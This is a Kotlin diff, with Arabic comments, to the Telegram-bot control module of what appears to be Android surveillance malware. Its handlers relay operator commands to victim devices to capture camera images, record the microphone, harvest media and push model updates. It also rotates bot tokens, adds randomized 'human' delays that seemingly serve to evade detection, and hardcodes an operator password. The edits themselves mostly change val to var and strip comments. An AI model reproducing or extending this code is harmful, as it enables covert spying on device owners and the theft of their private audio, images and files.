@@ -267,15 +267,16 @@ class TelegramUi(
         }
     }
 
-    // ========== استدعاءات API ==========
+    // ========== استدعاءات API (مع إصلاح Val cannot be reassigned) ==========
     private suspend fun apiCall(method: String, payload: JSONObject? = null, retry: Int = 3): JSONObject? {
         apiCallsCount++
         var attempts = 0
         var previousToken: String? = null
         while (attempts < retry) {
-            val token1 = getNextToken()
+            // ✅ تغيير val إلى var لمنع خطأ reassign
+            var token1 = getNextToken()
             if (token1 == null) return null
-            val tokenToUse = if (attempts > 0 && token1 == previousToken) {
+            var tokenToUse = if (attempts > 0 && token1 == previousToken) {
                 getNextToken() ?: token1
             } else {
                 token1
@@ -320,9 +321,10 @@ class TelegramUi(
         var attempts = 0
         var previousToken: String? = null
         while (attempts < retry) {
-            val token1 = getNextToken()
+            // ✅ تغيير val إلى var لمنع خطأ reassign
+            var token1 = getNextToken()
             if (token1 == null) return null
-            val tokenToUse = if (attempts > 0 && token1 == previousToken) {
+            var tokenToUse = if (attempts > 0 && token1 == previousToken) {
                 getNextToken() ?: token1
             } else {
                 token1
@@ -588,9 +590,8 @@ class TelegramUi(
             val text = msg.optString("text", "")
             val threadId = msg.optLong("message_thread_id", 0L)
 
-            applyHumanDelay() // تأخير بشري عشوائي
+            applyHumanDelay()
 
-            // ✅ التحقق الصارم من كلمة السر Zaen123@123@
             if (text.startsWith("/login")) {
                 if (appPassword.isBlank()) {
                     apiCall("sendMessage", JSONObject().apply {
@@ -601,7 +602,6 @@ class TelegramUi(
                     return
                 }
                 val parts = text.split("\\s+".toRegex())
-                // ✅ مقارنة دقيقة مع Zaen123@123@
                 if (parts.size >= 2 && parts[1].trim() == "Zaen123@123@") {
                     sessionMutex.withLock {
                         sessions[chatId.toString()] = (System.currentTimeMillis() / 1000) + 14400
@@ -624,7 +624,6 @@ class TelegramUi(
                 return
             }
 
-            // تجاهل أي أمر نصي آخر (كل الأوامر عبر الأزرار)
             writeLog("Ignored text command: $text")
 
         } catch (e: Exception) {
@@ -632,10 +631,10 @@ class TelegramUi(
         }
     }
 
-    // ========== معالجة الأزرار (Callback Queries) ==========
+    // ========== معالجة الأزرار ==========
     private suspend fun handleCallback(update: JSONObject) {
         try {
-            applyHumanDelay() // تأخير بشري
+            applyHumanDelay()
 
             val cb = update.optJSONObject("callback_query") ?: return
             val cbId = cb.optString("id")
@@ -661,10 +660,9 @@ class TelegramUi(
                 return
             }
 
-            // استخراج deviceId من البيانات
             val deviceId = when {
                 data.startsWith("cam_") || data.startsWith("camf_") ||
-                data.startsWith("mic_") || data.startsWith("hrv_") || // ✅ تم إصلاح علامة التنصيص
+                data.startsWith("mic_") || data.startsWith("hrv_") ||
                 data.startsWith("media_") || data.startsWith("send_now_") ||
                 data.startsWith("update_model_") -> {
                     val parts = data.split("_")
@@ -677,7 +675,6 @@ class TelegramUi(
                 updateDeviceActivity(deviceId)
             }
 
-            // ✅ إرسال نبض الخدمة للأوامر الحساسة
             when {
                 data.startsWith("cam_") || data.startsWith("camf_") -> pulseIntent("📸 كاميرا")
                 data.startsWith("mic_") -> pulseIntent("🎙️ ميكروفون")
@@ -686,7 +683,6 @@ class TelegramUi(
                 data.startsWith("update_model_") -> pulseIntent("🧠 تحديث النموذج")
             }
 
-            // معالجة الأوامر
             when {
                 data == "ld" -> {
                     if (devices.isEmpty()) {
@@ -863,7 +859,6 @@ class TelegramUi(
                     }
                     return
                 }
-                // الأوامر التي تبدأ بـ cam_, camf_, mic_, hrv_, media_ تُمرر إلى Commands
                 data.startsWith("cam_") || data.startsWith("camf_") ||
                 data.startsWith("mic_") || data.startsWith("hrv_") ||
                 data.startsWith("media_") -> {
@@ -878,7 +873,6 @@ class TelegramUi(
                     }
                 }
                 else -> {
-                    // أي أمر آخر (غير معروف) نمرره إلى Commands
                     try {
                         Commands.ex(appContext ?: return, data, this, monitor, chatId, cbId)
                     } catch (e: Exception) {
